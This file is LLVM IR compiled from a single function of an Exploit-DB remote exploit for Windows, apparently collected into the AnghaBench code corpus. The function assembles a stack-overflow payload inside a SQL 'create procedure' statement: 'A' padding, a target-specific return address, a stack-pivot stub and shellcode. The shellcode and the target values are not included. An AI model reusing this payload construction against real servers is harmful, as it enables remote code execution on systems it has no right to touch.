; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_3650.c_make_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_3650.c_make_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@.str = private unnamed_addr constant [19 x i8] c"create procedure \22\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@stabstack = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"\22()\0A begin\0A end;\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_buffer(i8* %0, i32 %1, i32 %2, i8* %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca [1000 x i8], align 16
  %10 = alloca i8*, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i8* %3, i8** %8, align 8
  %11 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %12 = call i32 @memset(i8* %11, i8 signext 0, i32 1000)
  %13 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %14 = load i32, i32* %7, align 4
  %15 = load i8*, i8** %8, align 8
  %16 = call i32 @prepare_shellcode(i8* %13, i32 %14, i8* %15)
  %17 = load i8*, i8** %5, align 8
  %18 = call i32 @memset(i8* %17, i8 signext 0, i32 8)
  %19 = load i8*, i8** %5, align 8
  store i8* %19, i8** %10, align 8
  %20 = load i8*, i8** %5, align 8
  %21 = call i32 @strcat(i8* %20, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %22 = load i8*, i8** %5, align 8
  %23 = load i8*, i8** %5, align 8
  %24 = call i32 @strlen(i8* %23)
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %22, i64 %25
  store i8* %26, i8** %10, align 8
  %27 = load i8*, i8** %10, align 8
  %28 = call i32 @memset(i8* %27, i8 signext 65, i32 255)
  %29 = load i8*, i8** %10, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = load i8*, i8** %10, align 8
  %32 = sext i32 %30 to i64
  %33 = getelementptr inbounds i8, i8* %31, i64 %32
  store i8* %33, i8** %10, align 8
  %34 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i64 %36
  %38 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 4
  %40 = and i32 %39, 255
  %41 = trunc i32 %40 to i8
  %42 = load i8*, i8** %10, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %10, align 8
  store i8 %41, i8* %42, align 1
  %44 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %45 = load i32, i32* %6, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i64 %46
  %48 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = ashr i32 %49, 8
  %51 = and i32 %50, 255
  %52 = trunc i32 %51 to i8
  %53 = load i8*, i8** %10, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %10, align 8
  store i8 %52, i8* %53, align 1
  %55 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %55, i64 %57
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %58, i32 0, i32 0
  %60 = load i32, i32* %59, align 4
  %61 = ashr i32 %60, 16
  %62 = and i32 %61, 255
  %63 = trunc i32 %62 to i8
  %64 = load i8*, i8** %10, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %10, align 8
  store i8 %63, i8* %64, align 1
  %66 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %67 = load i32, i32* %6, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %66, i64 %68
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 0
  %71 = load i32, i32* %70, align 4
  %72 = ashr i32 %71, 24
  %73 = and i32 %72, 255
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %10, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 1
  store i8* %76, i8** %10, align 8
  store i8 %74, i8* %75, align 1
  %77 = load i8*, i8** %10, align 8
  %78 = getelementptr inbounds i8, i8* %77, i32 1
  store i8* %78, i8** %10, align 8
  store i8 65, i8* %77, align 1
  %79 = load i8*, i8** %10, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %10, align 8
  store i8 65, i8* %79, align 1
  %81 = load i8*, i8** %10, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 1
  store i8* %82, i8** %10, align 8
  store i8 65, i8* %81, align 1
  %83 = load i8*, i8** %10, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %10, align 8
  store i8 65, i8* %83, align 1
  %85 = load i8*, i8** %10, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %10, align 8
  store i8 65, i8* %85, align 1
  %87 = load i8*, i8** %10, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %10, align 8
  store i8 65, i8* %87, align 1
  %89 = load i8*, i8** %10, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %10, align 8
  store i8 65, i8* %89, align 1
  %91 = load i8*, i8** %10, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %10, align 8
  store i8 65, i8* %91, align 1
  %93 = load i8*, i8** %10, align 8
  %94 = load i8*, i8** @stabstack, align 8
  %95 = load i8*, i8** @stabstack, align 8
  %96 = call i32 @strlen(i8* %95)
  %97 = call i32 @memcpy(i8* %93, i8* %94, i32 %96)
  %98 = load i8*, i8** %10, align 8
  %99 = call i32 @strlen(i8* %98)
  %100 = load i8*, i8** %10, align 8
  %101 = sext i32 %99 to i64
  %102 = getelementptr inbounds i8, i8* %100, i64 %101
  store i8* %102, i8** %10, align 8
  %103 = load i8*, i8** %10, align 8
  %104 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %105 = getelementptr inbounds [1000 x i8], [1000 x i8]* %9, i64 0, i64 0
  %106 = call i32 @strlen(i8* %105)
  %107 = call i32 @memcpy(i8* %103, i8* %104, i32 %106)
  %108 = load i8*, i8** %10, align 8
  %109 = call i32 @strlen(i8* %108)
  %110 = load i8*, i8** %10, align 8
  %111 = sext i32 %109 to i64
  %112 = getelementptr inbounds i8, i8* %110, i64 %111
  store i8* %112, i8** %10, align 8
  %113 = load i8*, i8** %10, align 8
  %114 = call i32 @memset(i8* %113, i8 signext 65, i32 10)
  %115 = load i8*, i8** %10, align 8
  %116 = call i32 @strlen(i8* %115)
  %117 = load i8*, i8** %10, align 8
  %118 = sext i32 %116 to i64
  %119 = getelementptr inbounds i8, i8* %117, i64 %118
  store i8* %119, i8** %10, align 8
  %120 = load i8*, i8** %10, align 8
  %121 = call i32 @strlen(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %122 = call i32 @memcpy(i8* %120, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0), i32 %121)
  ret void
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @prepare_shellcode(i8*, i32, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
